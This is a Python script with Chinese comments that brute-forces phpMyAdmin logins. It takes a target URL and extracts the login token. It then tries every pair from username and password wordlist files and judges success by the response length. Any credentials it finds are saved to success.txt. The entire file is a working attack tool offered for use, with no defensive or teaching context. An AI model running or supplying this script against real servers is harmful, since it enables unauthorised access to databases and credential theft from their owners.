#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: CoolCat
# @Modified: TARI 增加用户名字典，整理一下自己写代码的习惯
# 脚本功能：暴力破解phpMyadmin密码

import re
import time
import requests

# 延时爆破
timeDelay = 0

# 初次访问为 0
n = 0
contentLengthRaw = 0

url = input("URL:")
url = url.replace("\n", "").replace("\r", "").replace("index.php", "")

res = requests.get(url, timeout=2)
token = re.findall("name=\"token\" value=\"(.*?)\" /><fieldset>", res.text)
token = str(token)
token = token.replace("[u\'", "")
token = token.replace("\']", "")
print("[!]Token:" + token)

for uname in open("username.txt"):
    uname = uname.replace("\r", "").replace("\n", "") 
    for pwd in open("password.txt"):
        pwd = pwd.replace("\r", "").replace("\n", "")
        if res.status_code == 200:
            try:
                session = requests.session()
                fucker = {'pma_username': uname,
                          'pma_password': pwd,
                          "server": "1",
                          "target": "url.php",
                          'token': token}
                session.post(url, data=fucker)
                url2 = url + '/index.php?target=url.php&token=' + token
                r = session.get(url=url2, timeout=2)
            except:
                print("[!] 在验证账号:" + str(uname) + "密码:" + str(pwd) + " 时发生未知错误")
            # 第一次访问, 设置初始 http 返回头长度
            if n == 0:
                contentLengthRaw = len(r.text)
                print("[-]初始返回头长度设定为:" + str(len(r.text)) + "\n")
                n = n + 1
            contentLength = len(r.text)
            print("[?]正在验证账号:" + str(uname) + " 密码:" + str(pwd))
            if contentLength == contentLengthRaw:
                print("[-]返回头长度为:" + str(contentLength) + " 密码错误！")
            else:
                print("[+]返回头长度为:" + str(contentLength) + " 密码正确！")
                coolcat = open("success.txt", "a")
                coolcat.write(url + "的" + str(uname) + "密码为:" + str(pwd) + "\n")
                coolcat.close()
                exit()
        else:
            print(r.text)
        time.sleep(timeDelay)
